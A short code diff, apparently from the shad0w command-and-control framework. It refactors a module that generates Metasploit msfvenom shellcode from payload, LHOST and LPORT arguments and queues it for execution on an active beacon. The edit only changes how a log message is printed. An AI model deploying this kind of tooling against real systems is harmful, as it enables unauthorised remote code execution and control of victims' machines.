@@ -25,10 +25,10 @@ def exit(status=0, message=None):
     return
 
 
-def msfvenom_payload_gen(payload, lport, lhost, arch, beaconId):
+def msfvenom_payload_gen(shad0w, payload, lport, lhost, arch, beaconId):
 
     # Print some info
-    print(f"[i] Metasploit is building the shellcode...")
+    shad0w.debug.log(f"Metasploit is building the shellcode...", log=True)
 
     # put us in the correct dir (inside docker)
     os.chdir("/root/shad0w/bin/metasploit")
@@ -83,7 +83,7 @@ def main(shad0w, args):
         return
 
     # Generate and read the msfvenom shellcode
-    rcode = msfvenom_payload_gen(payload = args.payload, lport = args.port, lhost = args.host, arch="x64", beaconId = shad0w.current_beacon)
+    rcode = msfvenom_payload_gen(shad0w, payload = args.payload, lport = args.port, lhost = args.host, arch="x64", beaconId = shad0w.current_beacon)
 
     # set a task for the current beacon to do
     shad0w.beacons[shad0w.current_beacon]["task"] = (EXEC_ID, rcode)
